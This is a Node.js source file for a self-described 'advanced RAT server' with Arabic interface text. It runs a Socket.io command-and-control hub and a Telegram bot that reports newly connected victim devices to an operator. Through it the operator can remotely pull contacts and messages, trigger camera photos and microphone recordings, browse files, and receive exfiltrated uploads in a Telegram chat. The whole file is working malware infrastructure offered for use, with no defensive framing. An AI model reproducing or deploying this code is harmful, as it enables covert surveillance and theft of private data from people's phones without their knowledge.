const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class RATServer {
    constructor() {
        this.app = express();
        this.server = http.createServer(this.app);
        this.io = new Server(this.server, {
            pingTimeout: 60000,
            pingInterval: 25000,
            cors: { origin: "*" }
        });
        
        this.uploader = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 100 * 1024 * 1024 } // 100MB
        });
        
        this.loadConfig();
        this.bot = new telegramBot(this.config.token, { 
            polling: true,
            request: { timeout: 30000 }
        });
        
        this.appData = new Map();
        this.deviceManager = new DeviceManager();
        this.commandHandler = new CommandHandler();
        this.securityManager = new SecurityManager();
        
        this.setupRoutes();
        this.setupSocket();
        this.setupBot();
        this.startServices();
    }

    loadConfig() {
        try {
            this.config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
            this.config.port = process.env.PORT || 3000;
        } catch (error) {
            console.error('❌ خطأ في تحميل الإعدادات:', error);
            process.exit(1);
        }
    }

    setupRoutes() {
        // Route for file upload
        this.app.post('/upload', this.uploader.single('file'), (req, res) => {
            this.handleFileUpload(req, res);
        });

        // Route for health check
        this.app.get('/health', (req, res) => {
            res.json({
                status: '🟢 نشط',
                devices: this.deviceManager.getConnectedCount(),
                uptime: process.uptime(),
                memory: process.memoryUsage()
            });
        });

        // Serve static files for web dashboard
        this.app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
    }

    setupSocket() {
        this.io.on('connection', (socket) => {
            const deviceInfo = this.securityManager.authenticateDevice(socket);
            
            if (!deviceInfo) {
                socket.disconnect();
                return;
            }

            const device = this.deviceManager.registerDevice(socket, deviceInfo);
            
            this.handleDeviceConnection(device);
            this.setupDeviceHandlers(device);
        });
    }

    setupBot() {
        // Start command
        this.bot.onText(/\/start/, (msg) => {
            this.sendMainMenu(msg.chat.id);
        });

        // Message handler
        this.bot.on('message', (msg) => {
            this.handleBotMessage(msg);
        });

        // Callback query handler
        this.bot.on('callback_query', (query) => {
            this.handleCallbackQuery(query);
        });

        // Error handling
        this.bot.on('error', (error) => {
            console.error('❌ خطأ في البوت:', error);
        });
    }

    handleFileUpload(req, res) {
        try {
            const { deviceId, filePath } = req.body;
            const fileBuffer = req.file.buffer;
            const fileName = req.file.originalname;

            this.bot.sendDocument(this.config.id, fileBuffer, {
                caption: `📁 <b>تم استلام ملف من الجهاز:</b> ${deviceId}\n📝 <b>الاسم:</b> ${fileName}\n📁 <b>المسار:</b> ${filePath}`,
                parse_mode: 'HTML'
            }, {
                filename: fileName,
                contentType: req.file.mimetype
            });

            res.json({ status: 'success', message: '✅ تم رفع الملف' });
        } catch (error) {
            console.error('❌ خطأ في رفع الملف:', error);
            res.status(500).json({ status: 'error', message: 'فشل في رفع الملف' });
        }
    }

    handleDeviceConnection(device) {
        const connectionMsg = `
🟢 <b>اتصال جهاز جديد</b>

📱 <b>الجهاز:</b> ${device.info.name}
🔧 <b>الموديل:</b> ${device.info.model}  
🌐 <b>IP:</b> ${device.info.ip}
🆔 <b>المعرف:</b> ${device.id}
⚡ <b>الإصدار:</b> ${device.info.version || 'غير معروف'}
📊 <b>البطارية:</b> ${device.info.battery || 'غير معروف'}%
💾 <b>التخزين:</b> ${device.info.storage || 'غير معروف'}

⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
        `.trim();

        this.bot.sendMessage(this.config.id, connectionMsg, { 
            parse_mode: 'HTML',
            reply_markup: this.generateDeviceKeyboard(device.id)
        });

        // Request device status
        device.socket.emit('commend', {
            request: 'getStatus',
            extras: []
        });
    }

    setupDeviceHandlers(device) {
        device.socket.on('disconnect', (reason) => {
            this.handleDeviceDisconnection(device, reason);
        });

        device.socket.on('deviceStatus', (status) => {
            this.handleDeviceStatus(device, status);
        });

        device.socket.on('fileList', (fileList) => {
            this.handleFileList(device, fileList);
        });

        device.socket.on('message', (message) => {
            this.handleDeviceMessage(device, message);
        });

        device.socket.on('commandResult', (result) => {
            this.handleCommandResult(device, result);
        });
    }

    handleDeviceDisconnection(device, reason) {
        const disconnectMsg = `
🔴 <b>انقطع اتصال الجهاز</b>

📱 <b>الجهاز:</b> ${device.info.name}
🔧 <b>الموديل:</b> ${device.info.model}
🆔 <b>المعرف:</b> ${device.id}
📉 <b>السبب:</b> ${reason}

⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
        `.trim();

        this.bot.sendMessage(this.config.id, disconnectMsg, { parse_mode: 'HTML' });
        this.deviceManager.unregisterDevice(device.id);
    }

    handleBotMessage(msg) {
        const chatId = msg.chat.id;
        const text = msg.text;

        if (text === '📱 الأجهزة المتصلة') {
            this.sendDevicesList(chatId);
        } else if (text === '⚙️ الإعدادات') {
            this.sendSettingsMenu(chatId);
        } else if (text === '📊 الإحصائيات') {
            this.sendStatistics(chatId);
        } else if (this.appData.get('currentAction')) {
            this.handleActionInput(msg);
        } else {
            this.bot.sendMessage(chatId, '❓ أمر غير معروف، استخدم /start للعودة للقائمة الرئيسية');
        }
    }

    sendMainMenu(chatId) {
        const menuText = `
🎯 <b>مرحباً بك في سيرفر RAT المتقدم</b>

📊 <b>الإحصائيات:</b>
• الأجهزة المتصلة: ${this.deviceManager.getConnectedCount()}
• وقت التشغيل: ${Math.round(process.uptime() / 60)} دقيقة
• الذاكرة المستخدمة: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB

🔧 <b>اختر من القائمة:</b>
        `.trim();

        const keyboard = {
            keyboard: [
                ['📱 الأجهزة المتصلة', '⚙️ الإعدادات'],
                ['📊 الإحصائيات', '🔄 تحديث']
            ],
            resize_keyboard: true
        };

        this.bot.sendMessage(chatId, menuText, { 
            parse_mode: 'HTML', 
            reply_markup: keyboard 
        });
    }

    sendDevicesList(chatId) {
        const devices = this.deviceManager.getAllDevices();
        
        if (devices.length === 0) {
            this.bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة حالياً');
            return;
        }

        let devicesList = `📱 <b>الأجهزة المتصلة:</b> (${devices.length})\n\n`;
        
        devices.forEach((device, index) => {
            devicesList += `${index + 1}. <b>${device.info.name}</b>\n`;
            devicesList += `   🆔: ${device.id}\n`;
            devicesList += `   📱: ${device.info.model}\n`;
            devicesList += `   🌐: ${device.info.ip}\n`;
            devicesList += `   ⚡: ${device.info.battery || 'غير معروف'}%\n\n`;
        });

        const keyboard = {
            inline_keyboard: devices.map(device => [{
                text: `📱 ${device.info.name}`,
                callback_data: `device_${device.id}`
            }])
        };

        this.bot.sendMessage(chatId, devicesList, { 
            parse_mode: 'HTML', 
            reply_markup: keyboard 
        });
    }

    generateDeviceKeyboard(deviceId) {
        return {
            inline_keyboard: [
                [
                    { text: '📞 جهات الاتصال', callback_data: `contacts_${deviceId}` },
                    { text: '💬 الرسائل', callback_data: `messages_${deviceId}` }
                ],
                [
                    { text: '📸 الكاميرا', callback_data: `camera_${deviceId}` },
                    { text: '🎙 الميكروفون', callback_data: `microphone_${deviceId}` }
                ],
                [
                    { text: '📁 الملفات', callback_data: `files_${deviceId}` },
                    { text: '📊 الحالة', callback_data: `status_${deviceId}` }
                ],
                [
                    { text: '⚙️ الإعدادات', callback_data: `settings_${deviceId}` },
                    { text: '🔒 الأمان', callback_data: `security_${deviceId}` }
                ]
            ]
        };
    }

    startServices() {
        // Health monitoring
        setInterval(() => {
            this.deviceManager.healthCheck();
        }, 30000);

        // Cleanup inactive devices
        setInterval(() => {
            this.deviceManager.cleanupInactiveDevices();
        }, 60000);

        // Status reporting
        setInterval(() => {
            this.reportServerStatus();
        }, 300000); // 5 minutes

        console.log(`🚀 السيرفر يعمل على البورت ${this.config.port}`);
    }

    reportServerStatus() {
        const status = `
📊 <b>تقرير حالة السيرفر</b>

🟢 <b>الحالة:</b> نشط
📱 <b>الأجهزة:</b> ${this.deviceManager.getConnectedCount()}
⏰ <b>وقت التشغيل:</b> ${Math.round(process.uptime() / 3600)} ساعة
💾 <b>الذاكرة:</b> ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB
🔗 <b>الاتصالات النشطة:</b> ${this.io.engine.clientsCount}
        `.trim();

        this.bot.sendMessage(this.config.id, status, { parse_mode: 'HTML' });
    }

    start() {
        this.server.listen(this.config.port, () => {
            console.log(`🎯 سيرفر RAT المتقدم يعمل على البورت ${this.config.port}`);
            console.log(`🤖 بوت التيلجرام نشط للمستخدم: ${this.config.id}`);
        });
    }
}

class DeviceManager {
    constructor() {
        this.devices = new Map();
        this.stats = {
            totalConnections: 0,
            activeConnections: 0
        };
    }

    registerDevice(socket, deviceInfo) {
        const deviceId = this.generateDeviceId(deviceInfo);
        
        const device = {
            id: deviceId,
            socket: socket,
            info: deviceInfo,
            lastSeen: Date.now(),
            status: 'connected'
        };

        this.devices.set(deviceId, device);
        this.stats.totalConnections++;
        this.stats.activeConnections++;

        console.log(`✅ جهاز متصل: ${deviceInfo.name} (${deviceId})`);
        return device;
    }

    unregisterDevice(deviceId) {
        if (this.devices.has(deviceId)) {
            this.devices.delete(deviceId);
            this.stats.activeConnections--;
            console.log(`❌ جهاز منفصل: ${deviceId}`);
        }
    }

    generateDeviceId(deviceInfo) {
        const uniqueString = `${deviceInfo.name}-${deviceInfo.model}-${Date.now()}`;
        return crypto.createHash('md5').update(uniqueString).digest('hex').substring(0, 8);
    }

    getDevice(deviceId) {
        return this.devices.get(deviceId);
    }

    getAllDevices() {
        return Array.from(this.devices.values());
    }

    getConnectedCount() {
        return this.stats.activeConnections;
    }

    healthCheck() {
        const now = Date.now();
        this.devices.forEach((device, deviceId) => {
            if (now - device.lastSeen > 120000) { // 2 minutes
                device.socket.emit('ping', {});
                device.lastSeen = now;
            }
        });
    }

    cleanupInactiveDevices() {
        const now = Date.now();
        this.devices.forEach((device, deviceId) => {
            if (now - device.lastSeen > 300000) { // 5 minutes
                console.log(`🧹 تنظيف جهاز غير نشط: ${deviceId}`);
                device.socket.disconnect();
                this.unregisterDevice(deviceId);
            }
        });
    }
}

class SecurityManager {
    authenticateDevice(socket) {
        try {
            const headers = socket.handshake.headers;
            
            // Basic device info extraction
            const deviceInfo = {
                name: headers['user-agent'] || 'Unknown Device',
                model: headers['model'] || 'Unknown Model',
                ip: headers['x-forwarded-for'] || socket.handshake.address,
                version: headers['version'] || '1.0.0'
            };

            // Additional security checks can be added here
            if (!this.isValidDevice(deviceInfo)) {
                throw new Error('جهاز غير مصرح');
            }

            return deviceInfo;
        } catch (error) {
            console.error('❌ فشل مصادقة الجهاز:', error);
            return null;
        }
    }

    isValidDevice(deviceInfo) {
        // Add your device validation logic here
        // This is a basic example - enhance as needed
        return deviceInfo.name && deviceInfo.model;
    }
}

class CommandHandler {
    constructor() {
        this.commands = new Map();
        this.setupDefaultCommands();
    }

    setupDefaultCommands() {
        this.commands.set('getContacts', this.handleGetContacts.bind(this));
        this.commands.set('getMessages', this.handleGetMessages.bind(this));
        this.commands.set('takePhoto', this.handleTakePhoto.bind(this));
        this.commands.set('recordAudio', this.handleRecordAudio.bind(this));
        this.commands.set('getFiles', this.handleGetFiles.bind(this));
        this.commands.set('getStatus', this.handleGetStatus.bind(this));
    }

    handleGetContacts(device, extras) {
        device.socket.emit('commend', {
            request: 'contacts',
            extras: extras
        });
    }

    handleGetMessages(device, extras) {
        device.socket.emit('commend', {
            request: 'messages',
            extras: extras
        });
    }

    handleTakePhoto(device, extras) {
        device.socket.emit('commend', {
            request: 'camera',
            extras: extras
        });
    }

    handleRecordAudio(device, extras) {
        device.socket.emit('commend', {
            request: 'microphone',
            extras: extras
        });
    }

    handleGetFiles(device, extras) {
        device.socket.emit('commend', {
            request: 'fileExplorer',
            extras: extras
        });
    }

    handleGetStatus(device, extras) {
        device.socket.emit('commend', {
            request: 'deviceStatus',
            extras: extras
        });
    }

    execute(command, device, extras = []) {
        const handler = this.commands.get(command);
        if (handler) {
            handler(device, extras);
            return true;
        }
        return false;
    }
}

// Start the server
const ratServer = new RATServer();
ratServer.start();

module.exports = RATServer;
